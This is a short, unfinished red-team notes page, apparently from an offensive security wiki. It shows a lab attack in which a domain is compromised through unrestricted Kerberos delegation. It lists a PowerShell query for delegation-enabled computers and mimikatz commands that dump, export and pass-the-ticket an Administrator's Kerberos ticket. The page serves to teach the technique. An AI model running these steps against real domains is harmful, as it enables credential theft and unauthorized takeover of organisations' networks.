# Domain Compromise via Unrestricted Kerberos Delegation

{% hint style="warning" %}
WIP
{% endhint %}

![](../.gitbook/assets/screenshot-from-2018-10-29-23-01-49.png)

![](../.gitbook/assets/screenshot-from-2018-10-29-23-02-51.png)

Set IIS01 computer to unrestricted delegation:

![](../.gitbook/assets/screenshot-from-2018-10-29-22-50-27.png)

Finding computers on a domain that have unrestricted kerberos delegation property set:

```csharp
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

![](../.gitbook/assets/screenshot-from-2018-10-29-23-08-06.png)



![](../.gitbook/assets/screenshot-from-2018-10-29-23-35-01.png)



```text
Invoke-WebRequest http://iis01.offense.local -UseDefaultCredentials -UseBasicParsing
```

![](../.gitbook/assets/screenshot-from-2018-10-29-23-35-20.png)

```text
mimikatz # sekurlsa::tickets
```

![](../.gitbook/assets/screenshot-from-2018-10-29-23-40-27.png)



```text
mimikatz::tickets /export
```

![](../.gitbook/assets/screenshot-from-2018-10-29-23-56-20.png)

```text
mimikatz # kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
```

![](../.gitbook/assets/screenshot-from-2018-10-29-23-49-58.png)

![](../.gitbook/assets/screenshot-from-2018-10-29-23-50-40.png)

![](../.gitbook/assets/screenshot-from-2018-10-29-23-59-12.png)

{% embed url="https://adsecurity.org/?p=1667" %}

{% embed url="https://blog.xpnsec.com/kerberos-attacks-part-1/" %}

